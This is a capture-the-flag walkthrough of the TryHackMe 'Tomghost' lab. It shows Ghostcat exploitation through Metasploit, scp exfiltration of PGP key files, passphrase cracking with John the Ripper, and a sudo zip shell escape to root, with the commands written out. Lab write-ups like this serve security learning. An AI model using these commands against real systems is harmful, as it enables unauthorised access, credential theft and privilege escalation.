TryHackMe — Tomghost Exploitation and Privilege Escalation
Overview

This document details the compromise of a TryHackMe target running Apache Tomcat. The engagement involved identifying exposed AJP services, exploiting the Ghostcat vulnerability, recovering sensitive credentials, breaking PGP encryption, and escalating privileges to root.

1. Enumeration

Initial reconnaissance identified the following:
```bash
nmap -p- -Pn <IP>
nmap -A -p22,53,8009,8080 <IP>
```

Apache Tomcat 9.0.30

Apache JServ Protocol (AJP v1.3)

Service exposed on port 8009

The exposed AJP service strongly indicated susceptibility to the Ghostcat vulnerability (CVE-2020-1938).

2. Exploitation — Ghostcat

The Ghostcat vulnerability was exploited using the Metasploit framework:

auxiliary/admin/http/tomcat_ghostcat


The module successfully disclosed credentials for the user skyfuck.

3. Initial Access

Authenticated access to the machine was achieved via SSH using the recovered credentials.
During post-exploitation enumeration, the user.txt flag was located within:

/home/merlin

4. Discovery of Sensitive Files

Within the skyfuck user’s directory, the following files were identified:

credential.pgp
tryhackme.asc


These files were exfiltrated to the attacker machine using SCP for offline analysis.
```bash
scp skyfuck@10.49.173.254:/home/skyfuck/tryhackme.asc  ~/Downloads/
scp skyfuck@10.49.173.254:/home/skyfuck/credential.pgp  ~/Downloads/
```

5. PGP Key and Passphrase Recovery

A hash was generated using gpg2john and The hash was then cracked using John the Ripper to recover the key passphrase.:
```bash
gpg2john tryhackme.asc > hash1.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt 
```
The private key was imported:
```bash
gpg --import tryhackme.asc
```
With the passphrase obtained, the encrypted file was decrypted:
```bash
gpg --output decry --decrypt credential.pgp
```

The decrypted output revealed valid SSH credentials for user merlin.

6. Privilege Escalation

After logging in as merlin, the following command was executed to review sudo permissions:
```bash
sudo -l
```

The output indicated:
```text
(ALL) NOPASSWD: /usr/bin/zip
```

Referencing GTFOBins, a zip exploitation technique was used to gain a root shell:
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

Root access was successfully obtained.

7. Root Flag

The root flag was retrieved:
```bash
cd /root
cat root.txt
```

Thoughts:
This was a relatively straightforward machine. The Ghostcat foothold required minimal effort once identified, and the real work was in credential handling and privilege escalation. The PGP cracking and sudo zip abuse were the most interesting parts, reinforcing the importance of misconfigurations and poor key management.
